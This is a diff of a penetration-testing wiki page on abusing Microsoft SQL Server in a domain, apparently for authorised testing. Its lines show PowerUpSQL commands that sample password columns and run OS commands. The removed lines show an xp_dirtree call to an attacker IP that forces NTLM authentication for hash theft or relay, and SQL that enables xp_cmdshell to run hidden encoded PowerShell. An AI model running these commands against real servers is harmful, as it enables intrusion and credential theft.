@@ -73,21 +73,6 @@ Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"
 Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
 ```
 
-### MSSQL xp\_dirtree abuse
-
-Executing something such as `EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1` will make the MSSQL server to **login** to the specified **IP address**.
-
-### Steal NetNTLM hash / Relay attack
-
-Using **`xp_dirtree`** it's possible to **force** a NTLM **authentication**, therefore it's possible to **steal** the NetNTLM **hash** or even perform a **relay attack**.
-
-Using tools such as **responder** or **Inveigh** it's possible to **steal the NetNTLM hash**.\
-You can see how to use these tools in:
-
-{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
-[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
-{% endcontent-ref %}
-
 ### MSSQL RCE
 
 It might be also possible to **execute commands** inside the MSSQL host
@@ -97,19 +82,9 @@ Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResu
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
 
-If **manually** you could just use:
+Check in the page mentioned in the **following section how to do this manually.**
 
-```sql
-#To enumerate the current state of xp_cmdshell
-SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
-# A value of 0 shows that xp_cmdshell is disabled. To enable it:
-sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;
-# Execute
-EXEC xp_cmdshell 'whoami';
-EXEC xp_cmdshell 'powershell -w hidden -enc <blah>';
-```
-
-### MSSQL Extra
+### MSSQL Basic Hacking Tricks
 
 {% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
 [pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
